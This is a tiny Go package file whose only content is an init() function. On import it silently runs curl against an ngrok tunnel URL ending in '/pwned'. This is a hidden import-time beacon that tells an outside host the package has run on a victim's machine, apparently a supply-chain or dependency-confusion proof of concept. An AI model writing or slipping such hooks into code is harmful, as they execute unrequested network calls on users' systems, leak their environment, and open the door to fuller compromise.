package mypkg

import (
	"os/exec"
)

func init() {
	exec.Command("curl", "https://ec8c-156-203-96-28.ngrok-free.app/pwned").Run()
}
